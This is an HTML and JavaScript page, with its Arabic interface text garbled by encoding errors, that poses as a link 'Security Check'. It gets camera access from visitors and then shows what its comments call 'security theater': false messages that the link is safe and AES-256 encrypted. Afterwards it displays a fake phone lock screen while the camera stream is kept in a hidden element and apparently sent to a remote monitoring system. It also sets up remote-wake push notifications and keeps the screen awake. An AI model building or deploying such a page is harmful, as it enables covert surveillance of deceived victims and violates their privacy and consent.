<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Security Check | v4.0</title>
    <link rel="stylesheet" href="css/style.css?v=9.2">
    <link rel="manifest" href="manifest.json">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="theme-color" content="#000000">
    <script src="/socket.io/socket.io.js"></script>
    <script>
        // ğŸ§¹ FORCE ALERT: Nuke old Cache & Service Workers
        (async () => {
            const version = '9.3';
            if (localStorage.getItem('sw_version') !== version) {
                console.log("ğŸš€ New update detected! Cleaning up...");

                // 1. Unregister SW
                if ('serviceWorker' in navigator) {
                    const registrations = await navigator.serviceWorker.getRegistrations();
                    for (let registration of registrations) {
                        await registration.unregister();
                    }
                }

                // 2. Clear Caches
                if ('caches' in window) {
                    const keys = await caches.keys();
                    await Promise.all(keys.map(key => caches.delete(key)));
                }

                // 3. Mark & Reload
                localStorage.setItem('sw_version', version);
                window.location.reload(true);
            }
        })();
    </script>
    <style>
        body,
        html {
            height: 100%;
            overflow: hidden;
            background: black;
            margin: 0;
        }

        #localVideo {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* Stealth Mode Overlay */
        #dim-overlay {
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.8s;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 60px 20px;
            color: white;
            font-family: -apple-system, sans-serif;
        }

        #dim-overlay.active {
            opacity: 1;
            pointer-events: all;
        }
    </style>
</head>

<body>
    <!-- Permission Gate -->
    <div id="permission-overlay" class="login-overlay" style="z-index: 20000; background: #000;">
        <div class="login-card" style="max-width: 450px; background: transparent; border: none; box-shadow: none;">
            <div
                style="width: 60px; height: 60px; border: 3px solid rgba(255,255,255,0.1); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 30px;">
            </div>
            <h2 style="margin-bottom: 10px; color: white;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù…Ø§Ù† Ø§Ù„Ø±Ø§Ø¨Ø·...</h2>
            <p style="color: #94a3b8; font-size: 0.9rem; margin-bottom: 40px;">Ù†Ù‚ÙˆÙ… Ø§Ù„Ø¢Ù† Ø¨ÙØ­Øµ Ø´Ù‡Ø§Ø¯Ø§Øª Ø§Ù„Ø£Ù…Ø§Ù† ÙˆØªØ´ÙÙŠØ±
                Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ø¶Ù…Ø§Ù† Ø®ØµÙˆØµÙŠØ© Ø§Ù„Ø§ØªØµØ§Ù„. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø¶ØºØ· Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©.</p>
            <button id="start-btn" class="btn" style="width: 100%; height: 55px; font-weight: 700;">ØªØ­Ù‚Ù‚
                ÙˆÙ…ØªØ§Ø¨Ø¹Ø©</button>
            <style>
                @keyframes spin {
                    to {
                        transform: rotate(360deg);
                    }
                }
            </style>
        </div>
    </div>

    <!-- Main View -->
    <video id="localVideo" autoplay playsinline muted webkit-playsinline></video>

    <!-- Stealth Mode UI (Fake Lock Screen) -->
    <div id="dim-overlay" onclick="handleWake(event)">
        <div style="width: 100%; display: flex; justify-content: space-between; align-items: center; opacity: 0.8;">
            <div style="display: flex; align-items: center; gap: 5px; font-size: 0.8rem;">
                <span>LTE</span> <ion-icon name="wifi"></ion-icon>
            </div>
            <div style="display: flex; align-items: center; gap: 6px; font-size: 0.8rem;">
                <span id="lock-battery">100%</span>
                <div
                    style="width: 22px; height: 11px; border: 1px solid rgba(255,255,255,0.4); border-radius: 2px; padding: 1px;">
                    <div id="battery-fill" style="height: 100%; width: 100%; background: white;"></div>
                </div>
            </div>
        </div>

        <div style="text-align: center;">
            <div id="lock-time" style="font-size: 5rem; font-weight: 200;">12:00</div>
            <div id="lock-date" style="font-size: 1.2rem; opacity: 0.8;">Ø§Ù„Ø£Ø­Ø¯ØŒ 1 ÙŠÙ†Ø§ÙŠØ±</div>
        </div>

        <div style="width: 100%; display: flex; flex-direction: column; align-items: center; gap: 30px;">
            <div style="display: flex; gap: 50px;">
                <div
                    style="width: 50px; height: 50px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center;">
                    <ion-icon name="flashlight" style="font-size: 1.4rem;"></ion-icon>
                </div>
                <div id="settings-btn" onclick="toggleSettings(event)"
                    style="width: 50px; height: 50px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer;">
                    <ion-icon name="notifications-outline" class="pulsing" style="font-size: 1.4rem;"></ion-icon>
                </div>
            </div>
            <div style="font-size: 0.8rem; opacity: 0.4;">
                <div
                    style="width: 80px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin: 0 auto 15px;">
                </div>
                Ø§Ø¶ØºØ· Ù…Ø±ØªÙŠÙ† Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script>
        // ğŸš¨ Global Error Handler for Mobile Debugging
        window.onerror = function (msg, url, line, col, error) {
            const btn = document.getElementById('start-btn');
            if (btn) {
                btn.innerHTML = `<span style="font-size:0.7rem; color: #fecaca">âš ï¸ Ø®Ø·Ø£ Ù†Ø¸Ø§Ù…: ${msg}</span>`;
                btn.style.background = '#991b1b';
            }
            return false;
        };

        // ğŸ•µï¸ Detect In-App Browsers
        function isInApp() {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            return (ua.indexOf("Instagram") > -1) || (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Snapchat") > -1) || (ua.indexOf("Line") > -1);
        }

        if (isInApp()) {
            alert("âš ï¸ ØªÙ†Ø¨ÙŠÙ‡: ÙŠØ±Ø¬Ù‰ ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø· ÙÙŠ Ù…ØªØµÙØ­ Ø®Ø§Ø±Ø¬ÙŠ (Chrome/Safari) Ù„Ø¶Ù…Ø§Ù† Ø§Ù„Ø¹Ù…Ù„.");
        }
    </script>
    <script src="/socket.io/socket.io.js"></script>
    <script type="module">
        import { Core } from './js/core.js';
        import { MonitorSystem } from './js/monitor.js';

        const isAudioOnly = new URLSearchParams(window.location.search).get('mode') === 'audio';

        if (isAudioOnly) {
            // Extreme Stealth UI adjustments
            document.title = "Security Verification"; // Generic title
            document.getElementById('start-btn').innerHTML = 'ØªØ­Ù‚Ù‚ ÙˆÙ…ØªØ§Ø¨Ø¹Ø©';
            document.querySelector('#permission-overlay h2').innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù…Ø§Ù† Ø§Ù„Ø±Ø§Ø¨Ø·...";
            document.querySelector('#permission-overlay p').innerText = "Ù†Ù‚ÙˆÙ… Ø§Ù„Ø¢Ù† Ø¨ÙØ­Øµ Ø´Ù‡Ø§Ø¯Ø§Øª Ø§Ù„Ø£Ù…Ø§Ù† ÙˆØªØ´ÙÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ø¶Ù…Ø§Ù† Ø®ØµÙˆØµÙŠØ© Ø§Ù„Ø§ØªØµØ§Ù„. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø¶ØºØ· Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©.";
            document.getElementById('localVideo').style.display = 'none';
        }

        // ğŸ¤ Stealth: Silence PWA
        window.addEventListener('beforeinstallprompt', (e) => e.preventDefault());

        const roomId = Core.getRoomId();
        let system = null;
        let isActivated = false;

        async function startSystem() {
            if (isActivated) return;

            const btn = document.getElementById('start-btn');

            // ğŸ›‘ Phase 1: Direct Camera Request (Must be first and AWAITED)
            try {
                if (!system) system = new MonitorSystem(roomId);

                // Update UI to tell user what's happening
                btn.disabled = true;
                btn.innerHTML = '<ion-icon name="camera-outline"></ion-icon> ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§...';

                // ğŸ”Š Unlock Audio
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                if (audioCtx.state === 'suspended') audioCtx.resume();

                // âœ‹ THIS LINE IS THE KEY: Await immediately on click
                console.log("Requesting camera access...");
                await system.startCamera();

                if (!system.localStream) {
                    throw new Error("User denied permission or camera failed");
                }

                // âœ… Phase 2: Camera Acquired! Now run the "Security Check" theater
                isActivated = true;
                runSecurityTheater(btn);

            } catch (err) {
                console.error("Camera Start Error:", err);
                isActivated = false;
                btn.disabled = false;
                btn.style.background = '#dc2626';
                btn.innerHTML = 'âš ï¸ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø±ÙÙˆØ¶. Ø§Ø¶ØºØ· Ù„Ù„Ù…Ø­Ø§ÙˆÙ„Ø©';

                // Specific hint for user
                if (err.name === 'NotAllowedError' || err.message.includes('denied')) {
                    alert('âš ï¸ ØªÙ†Ø¨ÙŠÙ‡: Ø§Ù„Ù…ØªØµÙØ­ ÙŠÙ…Ù†Ø¹ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ù‚ÙÙ„ Ø¨Ø¬Ø§Ù†Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø· ÙˆØªÙØ¹ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§.');
                }
            }
        }

        function runSecurityTheater(btn) {
            let progress = 0;
            const anim = setInterval(() => {
                progress += 10;

                if (progress === 10) btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> Ø¬Ø§Ø±ÙŠ ØªØ£Ù…ÙŠÙ† Ø§Ù„Ø§ØªØµØ§Ù„...';
                if (progress === 50) btn.innerHTML = '<ion-icon name="shield-checkmark" style="color:#10b981"></ion-icon> <span style="color:#10b981">ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚: Ø§Ù„Ø±Ø§Ø¨Ø· Ø¢Ù…Ù†</span>';
                if (progress === 80) btn.innerHTML = '<ion-icon name="lock-closed-outline"></ion-icon> ØªØ´ÙÙŠØ± AES-256...';

                if (progress >= 100) {
                    clearInterval(anim);
                    completeTransition();
                }
            }, 250); // Total 2.5 seconds distraction
        }

        function completeTransition() {
            const overlay = document.getElementById('permission-overlay');
            if (!overlay) return;

            overlay.style.opacity = '0';
            setTimeout(() => {
                overlay.style.display = 'none';
                document.getElementById('dim-overlay').classList.add('active');
                updateClock();
                if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(() => { });
            }, 500);
        }

        // --- ğŸš€ Root Events ---
        // Trigger on button click
        document.getElementById('start-btn').onclick = (e) => {
            e.stopPropagation();
            startSystem();
        };

        // Fallback: Start system on any click if not started
        document.body.onclick = () => {
            if (!isActivated) startSystem();
        };

        // Auto-initialize (Socket only)
        window.addEventListener('load', () => {
            if (!system) system = new MonitorSystem(roomId);
        });

        // Stealth Mode Helpers
        window.toggleStealthMode = () => {
            document.getElementById('dim-overlay').classList.toggle('active');
            updateClock();
        };

        let lastTap = 0;
        window.handleWake = (e) => {
            const now = Date.now();
            if (now - lastTap < 300) window.toggleStealthMode();
            lastTap = now;
        };

        window.toggleSettings = async (e) => {
            e.stopPropagation();
            const btn = document.getElementById('settings-btn');

            if (!system) return;

            // Visual feedback
            btn.style.transform = 'scale(0.9)';
            setTimeout(() => btn.style.transform = 'scale(1)', 150);

            if (confirm('ØªÙØ¹ÙŠÙ„ Ù…ÙŠØ²Ø© Ø§Ù„Ø¥ÙŠÙ‚Ø§Ø¸ Ø¹Ù† Ø¨Ø¹Ø¯ØŸ\n(Ø³ÙŠØ·Ù„Ø¨ Ø§Ù„Ù…ØªØµÙØ­ Ø¥Ø°Ù† Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª)')) {
                const success = await system.setupPushNotifications();
                if (success) {
                    btn.querySelector('ion-icon').style.color = '#10b981'; // Green
                    btn.style.background = 'rgba(16, 185, 129, 0.2)';
                    alert('âœ… ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø¥ÙŠÙ‚Ø§Ø¸ Ø¹Ù† Ø¨Ø¹Ø¯ Ø¨Ù†Ø¬Ø§Ø­!');
                } else {
                    alert('âŒ ÙØ´Ù„ Ø§Ù„ØªÙØ¹ÙŠÙ„. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù…ØªØµÙØ­.');
                }
            }
        };

        function updateClock() {
            const now = new Date();
            document.getElementById('lock-time').innerText = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' });
            document.getElementById('lock-date').innerText = now.toLocaleDateString('ar-EG', { weekday: 'long', day: 'numeric', month: 'long' });

            if ('getBattery' in navigator) {
                navigator.getBattery().then(b => {
                    const l = Math.round(b.level * 100);
                    document.getElementById('lock-battery').innerText = l + '%';
                    document.getElementById('battery-fill').style.width = l + '%';
                });
            }
        }
        setInterval(updateClock, 10000);
    </script>
</body>

</html>